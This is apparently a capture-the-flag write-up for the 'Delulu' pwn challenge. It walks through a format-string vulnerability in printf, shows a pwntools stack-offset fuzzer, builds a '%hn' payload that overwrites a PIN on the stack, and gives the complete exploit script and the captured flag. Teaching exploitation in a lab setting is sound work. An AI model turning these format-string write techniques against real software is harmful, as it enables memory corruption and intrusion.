## Delulu [Very Easy]
### Initial Analysis
As usual, we start by checking the binary's protections and I particularly like to run [cwe_checker](https://github.com/fkie-cad/cwe_checker) on all challenges so we have a starting point in case nothing comes to mind after the analysis.
```bash
$ checksec delulu_patched
[*] '/home/flame/0x/ctf/htb-cyber-apocalypse-2024/pwn/delulu/challenge/delulu_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

$ cwe_checker ./delulu_patched
[CWE134] (0.1) (Externally Controlled Format String) Potential externally controlled format string for call to printf at 001014cb
```

As mentioned before, `cwe_checker` can be very useful in some cases, in this case it already detects a possible format string vulnerability in `printf`, and looking at the `checksec` output, we see that the binary has all possible protections detectable, so it's probably not a buffer overflow or anything like that.
In this challenge, we also have the source code for the binary, so we don't need the reverse engineering phase.
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 pin[2]; // [rsp+0h] [rbp-40h] BYREF
  __int64 buf[6]; // [rsp+10h] [rbp-30h] BYREF

  buf[5] = __readfsqword(40u);
  pin[0] = 0x1337BABE;
  pin[1] = (__int64)pin;
  memset(buf, 0, 32);
  read(0, buf, 31uLL);
  printf("\n[!] Checking.. ");
  printf((const char *)buf);
  if ( pin[0] == 0x1337BEEF )
    delulu();
  else
    error("ALERT ALERT ALERT ALERT\n");
  return 0;
}

unsigned __int64 delulu()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(40u);
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
    exit(1);
  }
  printf("You managed to deceive the robot, here's your new identity: ");
  while ( read(fd, &buf, 1uLL) > 0 )
    fputc(buf, _bss_start);
  close(fd);
  return v3 - __readfsqword(0x28u);
}
```

The program simply checks if the value of pin is equal to `0x1337beef`, but this variable is already set to a value previously, the trick in this case is to overwrite the value of the variable in the stack by means of a **format string vulnerability**.

First of all, we basically need to find the position of the variable in the stack

Normally, in binaries with **format string vulnerability**, I use a fuzzing script similar to this one to map the values on the stack, bringing along their offset
```python
from pwn import *
elf = context.binary = ELF("./delulu_patched", checksec=False)

for i in range(100):
    try:
        p = process(level="error")
        p.sendlineafter(b">> ", "%{}$p".format(i).encode())

        result = p.recvuntil(b"[-]", drop=True)
        result = result.strip().split()[2]
        
        print(str(i) + ": " + str(result))
        p.close()
    except EOFError:
        pass
```

We can see that the value of the variable is in position `6` of the stack, the next address, at offset `7`, must be the actual address of the variable
```bash
~/delulu $ python3 fuzz.py
0: b'%0$p'
1: b'0x7fff0372f270'
2: b'(nil)'
3: b'0x7887ccb14887'
4: b'0x10'
5: b'0x7fffffff'
6: b'0x1337babe'
7: b'0x7fff2b59d3b0'
```

To confirm this, we can change the type of value we want to return in the format string payload, we'll change `$s` (string)
```bash
~/delulu $ python3 fuzz.py
0: b'%0$s'
1: b'[!]'
2: b'(null)'
3: b'H='
7: b'\xbe\xba7\x13'
```

Now we can see that the value of offset `7` in string, is the value of the `PIN` variable, knowing the offset to the variable address, we need to overwrite this value in the stack

>Some useful resources: \
https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/#overwriting-memory-at-any-location \
https://axcheron.github.io/exploit-101-format-strings/#writing-to-the-stack

Since we only need to change the bytes of the variable (1337**babe** > 1337**beef**), the process becomes faster and easier, we can do it in two ways:
Using the hexadecimal value we want to overwrite and the position 
```python
payload = f"%{0xbeef}c%7$hn"
```

Or using the decimal representation
```python
payload = "%48879x%7$hn"
```

Note that in both examples we are using `$hn` instead of just $n, because we only want to overwrite the first **2 bytes** **(little-endian)** of the variable.

| Modifier | Description                                                       | Example                                                    |
| -------- | ----------------------------------------------------------------- | ---------------------------------------------------------- |
| i$       | Direct parameter access; Specifies the parameter to use for input | `%2$x` : hex value of second parameter                     |
| %ix      | Width modifier. Specifies the minimum width of the output.        | `%8x`: Hex value taking up 8 columns                       |
| %hh      | Length modifier. Specifies that length is sizeof(char)            | `%hhn`: Writes 1 byte to target pointer                    |
| %h       | Length modifier. Specifies that length is sizeof(short)           | `%hn`: Writes 2 bytes (in 32 bit System) to target pointer |
### Solution
By understanding all the steps, we can put together the final exploit, which will look something like this
```python
#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gdbscript, *a, **kw
        )
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

exe = "./delulu_patched"
elf = context.binary = ELF(exe, checksec=False)

p = start()

payload = f"%{0xbeef}c%7$hn"

p.sendlineafter(b'>>', bytes(payload, 'latin-1'))
flag = p.recvall().strip().split()[-1].decode()
info("Flag: " + flag)
```

The result is
```bash
~/delulu $ python3 solve.py
[+] Starting local process './delulu_patched': pid 127360
[+] Receiving all data: Done (47.83KB)
[*] Process './delulu_patched' stopped with exit code 0 (pid 127360)
[*] Flag: HTB{m45t3r_0f_d3c3pt10n}
```

> Flag: HTB{m45t3r_0f_d3c3pt10n}
